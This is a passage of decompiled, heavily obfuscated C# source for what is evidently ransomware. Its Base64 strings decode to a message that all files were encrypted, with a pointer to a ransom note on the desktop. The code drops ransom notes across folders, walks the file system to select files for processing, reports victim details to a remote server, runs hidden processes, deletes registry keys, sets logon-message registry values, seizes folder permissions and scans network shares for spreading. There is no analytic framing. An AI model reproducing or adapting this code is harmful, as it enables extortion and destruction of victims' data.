		catch (Exception ex11)
		{
			if (eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(ZOToawIMfprr, getString_0(107395398) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373));
				streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107395332)));
				streamWriter.WriteLine(getString_0(107396260));
				streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107391782)));
				streamWriter.WriteLine(WxMkiEDbIXuahVVZ);
				if (paHHgwLQtjlpi == getString_0(107397017))
				{
					streamWriter.WriteLine(getString_0(107396260));
					streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107391749)) + Convert.ToString(gHJtQxzOYMxb.Count));
				}
				if (FjsJwHpFzPmVq)
				{
					streamWriter.WriteLine(getString_0(107396260));
					streamWriter.WriteLine(HnrHiFTDAEzVb(getString_0(107391640)));
					streamWriter.WriteLine(wdiXDjuJgNGJ.DThwkdtaJZ());
				}
			}
			else
			{
				string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373));
				if (!text10.Contains(WxMkiEDbIXuahVVZ) && !sFwpaHIPJDNK)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373), getString_0(107391607) + WxMkiEDbIXuahVVZ);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in mRCgNmhiRqq)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395373)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373), item + getString_0(107395373), overwrite: true);
				}
				else
				{
					string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373));
					if (!text11.Contains(WxMkiEDbIXuahVVZ) && !sFwpaHIPJDNK)
					{
						File.AppendAllText(item + getString_0(107395373), getString_0(107391607) + WxMkiEDbIXuahVVZ);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!dsaIGmLDhFHi && num > 10)
			{
				break;
			}
		}
		if (SyYKiPdzQWvgTS == getString_0(107396857))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392090)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392090));
					streamWriter2.WriteLine(HnrHiFTDAEzVb(getString_0(107392049)));
					streamWriter2.WriteLine(getString_0(107396260));
					streamWriter2.WriteLine(HnrHiFTDAEzVb(getString_0(107390863)));
					streamWriter2.WriteLine(WxMkiEDbIXuahVVZ + HnrHiFTDAEzVb(getString_0(107390230)));
					if (paHHgwLQtjlpi == getString_0(107397017))
					{
						streamWriter2.WriteLine(getString_0(107396260));
						streamWriter2.WriteLine(HnrHiFTDAEzVb(getString_0(107390249)) + HnrHiFTDAEzVb(getString_0(107391749)) + Convert.ToString(gHJtQxzOYMxb.Count) + HnrHiFTDAEzVb(getString_0(107390230)));
					}
					if (FjsJwHpFzPmVq)
					{
						streamWriter2.WriteLine(getString_0(107396260));
						streamWriter2.WriteLine(HnrHiFTDAEzVb(getString_0(107391640)));
						streamWriter2.WriteLine(wdiXDjuJgNGJ.DThwkdtaJZ());
					}
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373));
					if (!text12.Contains(WxMkiEDbIXuahVVZ) && !sFwpaHIPJDNK)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392090), HnrHiFTDAEzVb(getString_0(107390249)) + getString_0(107391607) + WxMkiEDbIXuahVVZ + HnrHiFTDAEzVb(getString_0(107390230)));
					}
				}
			}
			catch
			{
			}
		}
		if (dtnCJsApLCAXi == getString_0(107396857))
		{
			try
			{
				if (paHHgwLQtjlpi == getString_0(107397017))
				{
					wdiXDjuJgNGJ.rxhbvaQakaHGk(getString_0(107390188), getString_0(107390183), getString_0(107390138), string.Concat(HnrHiFTDAEzVb(getString_0(107396326)), new WebClient().DownloadString(HnrHiFTDAEzVb(getString_0(107396301))), getString_0(107390129), HnrHiFTDAEzVb(getString_0(107396223)), DateTime.Now, getString_0(107396260), HnrHiFTDAEzVb(getString_0(107390156)), Convert.ToString(gHJtQxzOYMxb.Count), getString_0(107396260), HnrHiFTDAEzVb(getString_0(107396694)), WxMkiEDbIXuahVVZ));
				}
				else
				{
					wdiXDjuJgNGJ.rxhbvaQakaHGk(getString_0(107390188), getString_0(107390183), getString_0(107390138), string.Concat(HnrHiFTDAEzVb(getString_0(107396326)), new WebClient().DownloadString(HnrHiFTDAEzVb(getString_0(107396301))), getString_0(107390129), HnrHiFTDAEzVb(getString_0(107396223)), DateTime.Now, getString_0(107396260), HnrHiFTDAEzVb(getString_0(107390156)), Convert.ToString(gHJtQxzOYMxb.Count), getString_0(107396260), HnrHiFTDAEzVb(getString_0(107396694)), WxMkiEDbIXuahVVZ));
				}
			}
			catch
			{
			}
		}
		if (ABReLBCMjuneq == getString_0(107396857))
		{
			try
			{
				iQiMcyOjrfdadjM.fohQxZZJFvHv(new Uri(getString_0(107390075)));
			}
			catch
			{
			}
		}
		if (SyYKiPdzQWvgTS == getString_0(107397017))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373)))
				{
					Process.Start(HnrHiFTDAEzVb(getString_0(107390074)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395373));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392090)))
				{
					Process.Start(HnrHiFTDAEzVb(getString_0(107390081)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392090));
				}
			}
			catch
			{
			}
		}
		if (eoLcmZbUyT == getString_0(107396857))
		{
			if (zMxsYkQZTHOZg == getString_0(107396857) && !string.IsNullOrEmpty(wrewuxbxUhFHvm) && !string.IsNullOrEmpty(dQwHEwZancIGi))
			{
				LpCXXmgFQRbebC(wrewuxbxUhFHvm, dQwHEwZancIGi);
			}
			else
			{
				LpCXXmgFQRbebC(getString_0(107390576), getString_0(107390515));
			}
		}
		if (dmnGDBbKbJHB != getString_0(107389801))
		{
			IUMNFwyRjdyh(dmnGDBbKbJHB);
		}
		if (!string.IsNullOrEmpty(hVHAamgGKApycpVZ))
		{
			try
			{
				File.Delete(hVHAamgGKApycpVZ);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397189))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397189)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(ZOToawIMfprr, getString_0(107389752) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (eCrtUqxUXqEDfkG)
		{
			try
			{
				File.AppendAllText(ZOToawIMfprr, getString_0(107389739));
			}
			catch (Exception)
			{
			}
		}
		if (OYgLNIskArR == getString_0(107389694))
		{
			kgxecZsMbpHn();
		}
	}

	public static void VKyPOTiwyovAK()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(HnrHiFTDAEzVb(getString_0(107389685)), HnrHiFTDAEzVb(getString_0(107390576)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int NWNHCyLoun(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> URgDlqMhRwahBlLO(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107390043)) && !text.Contains(getString_0(107390050)) && !text.Contains(getString_0(107390017)) && !text.ToLower().Contains(getString_0(107390000)) && !text.ToLower().Contains(getString_0(107389987)) && !text.Contains(getString_0(107389962)) && !text.Contains(getString_0(107389909)) && !text.ToLower().Contains(getString_0(107389928)) && !text.ToLower().Contains(getString_0(107389883)) && !text.ToLower().Contains(getString_0(107389846)) && !text.ToLower().Contains(getString_0(107389869)) && !text.ToLower().Contains(getString_0(107389820)) && !text.ToLower().Contains(getString_0(107389839)) && !text.ToLower().Contains(getString_0(107389826)) && !text.ToLower().Contains(getString_0(107389293)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107389236)) && !fileInfo.FullName.Contains(getString_0(107389251)) && !fileInfo.FullName.Contains(getString_0(107389202)) && !fileInfo.FullName.Contains(getString_0(107389217)) && !fileInfo.FullName.Contains(getString_0(107389200)) && !fileInfo.FullName.Contains(getString_0(107389151)) && !fileInfo.FullName.Contains(getString_0(107389166)) && !fileInfo.FullName.Contains(getString_0(107389117)) && !fileInfo.FullName.Contains(getString_0(107389136)) && !fileInfo.FullName.Contains(getString_0(107389083)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389102)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389089)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389072)) && !fileInfo.FullName.ToLower().Contains(getString_0(107389535)) && !fileInfo.FullName.Contains(HnrHiFTDAEzVb(getString_0(107389550))) && !fileInfo.FullName.Contains(getString_0(107389493)) && !fileInfo.FullName.Contains(getString_0(107397189)) && !fileInfo.FullName.Contains(getString_0(107389512)) && !fileInfo.FullName.EndsWith(getString_0(107395407)) && !fileInfo.FullName.EndsWith(getString_0(107389475)) && !fileInfo.FullName.EndsWith(getString_0(107389438)) && !fileInfo.FullName.EndsWith(getString_0(107389433)) && !fileInfo.FullName.EndsWith(getString_0(107389428)) && !fileInfo.FullName.Contains(getString_0(107389455)) && !fileInfo.FullName.Contains(AlXvbFdlnNXOi) && !fileInfo.FullName.Contains(ZOToawIMfprr) && !fileInfo.FullName.Contains(fnEjkTZXUzKS))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(jAynPWDbXCIKzXxz) * 1024.0 * 1024.0 && WdmZVvJAGkn == getString_0(107396857))
						{
							list.Add(fileInfo.FullName);
							zkFahwNpddHP(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && WdmZVvJAGkn == getString_0(107397017))
						{
							list.Add(fileInfo.FullName);
							zkFahwNpddHP(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void HfrIRSWYXajhN()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107389406));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!bxAnSckylQQtw.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107389385), getString_0(107397194)).Replace(getString_0(107389380), getString_0(107389385))
					.Replace(getString_0(107389339), getString_0(107390075))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					bxAnSckylQQtw.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107389385), getString_0(107397194)).Replace(getString_0(107389380), getString_0(107389385))
						.Replace(getString_0(107389339), getString_0(107390075))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107389334), getString_0(107390075)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string iDwobxXLVYBDUs(string SIoJXJWwWKOjX = "", string XUDrxUTMVeod = "")
	{
		string result = getString_0(107390075);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = SIoJXJWwWKOjX,
				Arguments = XUDrxUTMVeod,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void xINXPJyncFYvj(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107389357),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string zwAdSSSqsokmWfX(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string HnrHiFTDAEzVb(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void ueBThtuEITF(string GcbKDrZMpFSvjuqC = "", string uiwGatYtPXTo = "SW5mb3JtYXRpb24uLi4=", string lrbsnQxjefhp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		GcbKDrZMpFSvjuqC = zwAdSSSqsokmWfX(getString_0(107389308));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(GcbKDrZMpFSvjuqC), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107388699)), HnrHiFTDAEzVb(uiwGatYtPXTo));
				registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107388666)), HnrHiFTDAEzVb(lrbsnQxjefhp));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			GcbKDrZMpFSvjuqC = zwAdSSSqsokmWfX(getString_0(107388637));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(GcbKDrZMpFSvjuqC), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107388532)), HnrHiFTDAEzVb(uiwGatYtPXTo));
				registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107389011)), HnrHiFTDAEzVb(lrbsnQxjefhp));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void kwbymEbYECJfMFKO()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (zMxsYkQZTHOZg == getString_0(107396857) && !string.IsNullOrEmpty(wrewuxbxUhFHvm) && !string.IsNullOrEmpty(dQwHEwZancIGi))
				{
					ueBThtuEITF(getString_0(107390075), wrewuxbxUhFHvm, dQwHEwZancIGi);
				}
				else
				{
					ueBThtuEITF(getString_0(107390075), getString_0(107390576), getString_0(107390515));
				}
			}
		}
		catch
		{
		}
	}

	public static void LpCXXmgFQRbebC(string tqPIIyoxJV = "SW5mb3JtYXRpb24uLi4=", string ktRrFyaiYMdud = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(HnrHiFTDAEzVb(tqPIIyoxJV));
		val.set_BalloonTipText(HnrHiFTDAEzVb(ktRrFyaiYMdud));
		val.ShowBalloonTip(30000);
	}

	public static void IUMNFwyRjdyh(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107388982)), getString_0(107388997) + text + getString_0(107388956) + string_0);
	}

	private static void DYlmoBqDrgnbL()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		GPKTahFPqhtkDc();
		List<fQEsAhoqVjVt> list = fQEsAhoqVjVt.EZAGitnIbFK();
		foreach (fQEsAhoqVjVt item in list)
		{
			xvGpfMLcVJUVWi.Add(item.IPAddress);
		}
		List<string> source = xvGpfMLcVJUVWi;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1f == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1f = delegate(string string_0)
			{
				fauaHzBRvWA CS_0024_003C_003E8__locals0 = new fauaHzBRvWA();
				CS_0024_003C_003E8__locals0.rvmYFiBIPish = string_0;
				if ((!CS_0024_003C_003E8__locals0.rvmYFiBIPish.StartsWith(getString_0(107386188)) && !CS_0024_003C_003E8__locals0.rvmYFiBIPish.StartsWith(getString_0(107386183)) && !CS_0024_003C_003E8__locals0.rvmYFiBIPish.StartsWith(getString_0(107386142)) && !CS_0024_003C_003E8__locals0.rvmYFiBIPish.StartsWith(getString_0(107390075))) || !NSmpMkfnjXaqzv.NfTlqbseztXcZ(CS_0024_003C_003E8__locals0.rvmYFiBIPish))
				{
					return;
				}
				try
				{
					Thread.Sleep(IZRjbACZbN);
					bxAnSckylQQtw.Add(getString_0(107389385) + CS_0024_003C_003E8__locals0.rvmYFiBIPish + getString_0(107386129));
					try
					{
						if (rjVAnmtTRGwdsGoP)
						{
							Console.WriteLine(getString_0(107389385) + CS_0024_003C_003E8__locals0.rvmYFiBIPish + getString_0(107386129));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(IZRjbACZbN);
						bxAnSckylQQtw.Add(fauaHzBRvWA.getString_0(107389392) + CS_0024_003C_003E8__locals0.rvmYFiBIPish + fauaHzBRvWA.getString_0(107397201) + (char)int_0 + fauaHzBRvWA.getString_0(107404179));
						try
						{
							if (rjVAnmtTRGwdsGoP)
							{
								Console.WriteLine(fauaHzBRvWA.getString_0(107389392) + CS_0024_003C_003E8__locals0.rvmYFiBIPish + fauaHzBRvWA.getString_0(107397201) + (char)int_0 + fauaHzBRvWA.getString_0(107404179));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1f);
		try
		{
			NSmpMkfnjXaqzv.MecpQLWHVuWSL mecpQLWHVuWSL = new NSmpMkfnjXaqzv.MecpQLWHVuWSL(NSmpMkfnjXaqzv.KdBXPtRhiaea.PpgcUkvNcbhpzy, NSmpMkfnjXaqzv.nITKZzOJeILOR.kvqVsaRTIqS, NSmpMkfnjXaqzv.bAdiERJjoAjV.TvgbqVEajHnmh, NSmpMkfnjXaqzv.RxWLKRlhyWtPAIEe.XFiqdfMIyyNC);
			foreach (string item2 in mecpQLWHVuWSL)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107388951));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!bxAnSckylQQtw.Contains(item3.ToString()))
						{
							bxAnSckylQQtw.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (rjVAnmtTRGwdsGoP)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		IGPnsGDKEcXlp.MiQnSlBekFojFQ();
		try
		{
			if (rjVAnmtTRGwdsGoP)
			{
				Console.WriteLine(getString_0(107388902));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = zwAdSSSqsokmWfX(getString_0(107388637));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107388829)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107388804)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (pjpQyhsoHmee == getString_0(107396857))
		{
			xSFZkSzRCPc.aBCmmONwoOrygLfPa();
		}
		try
		{
			if (rjVAnmtTRGwdsGoP)
			{
				Console.WriteLine(getString_0(107388215));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107389406));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (bxAnSckylQQtw.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107389385), getString_0(107397194)).Replace(getString_0(107389380), getString_0(107389385))
					.Replace(getString_0(107389339), getString_0(107390075))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (rjVAnmtTRGwdsGoP)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107389385), getString_0(107397194)).Replace(getString_0(107389380), getString_0(107389385))
							.Replace(getString_0(107389339), getString_0(107390075))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107389334), getString_0(107390075)));
					}
				}
				catch
				{
				}
				bxAnSckylQQtw.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107389385), getString_0(107397194)).Replace(getString_0(107389380), getString_0(107389385))
					.Replace(getString_0(107389339), getString_0(107390075))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107389334), getString_0(107390075)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (rjVAnmtTRGwdsGoP)
			{
				Console.WriteLine(getString_0(107388158));
			}
		}
		catch
		{
		}
	}

	public static bool fTYEGqULfgfdMg()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107388089));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void ppBucnmnAMy(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = HnrHiFTDAEzVb(getString_0(107388056));
		processStartInfo.Arguments = getString_0(107388027) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool gzuABFpjzsBXl(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool zFZHgwXyEcLQD(string string_0)
	{
		try
		{
			AnuMykbEXRLdspfa CS_0024_003C_003E8__locals0 = new AnuMykbEXRLdspfa();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.tYWkLyhrowG = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.tYWkLyhrowG);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107388022);
		}
		catch
		{
			return false;
		}
	}

	public static string GfSBVIpDWPq(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void rrBseFoHixHDZ()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = zwAdSSSqsokmWfX(getString_0(107388045));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388419)));
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388394)));
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388345)));
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388320)));
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388056)));
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388327)));
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107388982)));
					registryKey.Close();
				}
				string_ = zwAdSSSqsokmWfX(getString_0(107388298));
				registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107387689)));
					registryKey.Close();
				}
				string_ = zwAdSSSqsokmWfX(getString_0(107387640));
				registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107387689)));
					registryKey.Close();
				}
				string_ = zwAdSSSqsokmWfX(getString_0(107387640));
				registryKey = Registry.CurrentUser.OpenSubKey(HnrHiFTDAEzVb(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(HnrHiFTDAEzVb(getString_0(107387689)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107387655)), HnrHiFTDAEzVb(getString_0(107387606)));
			iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107387589)), HnrHiFTDAEzVb(getString_0(107387548)));
			iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107387589)), HnrHiFTDAEzVb(getString_0(107387946)));
			iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107387885)), HnrHiFTDAEzVb(getString_0(107387836)));
		}
		catch
		{
		}
	}

	public static void dnVJbaOwGkkjKGJ(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(HnrHiFTDAEzVb(getString_0(107387763)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void QPvfAXYIDtzW()
	{
		string string_ = zwAdSSSqsokmWfX(getString_0(107387226));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(HnrHiFTDAEzVb(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(HnrHiFTDAEzVb(getString_0(107387177)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void GPKTahFPqhtkDc()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107387144)), HnrHiFTDAEzVb(getString_0(107387099)));
			iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107387144)), HnrHiFTDAEzVb(getString_0(107387481)));
		}
	}

	[DllImport("mpr.dll")]
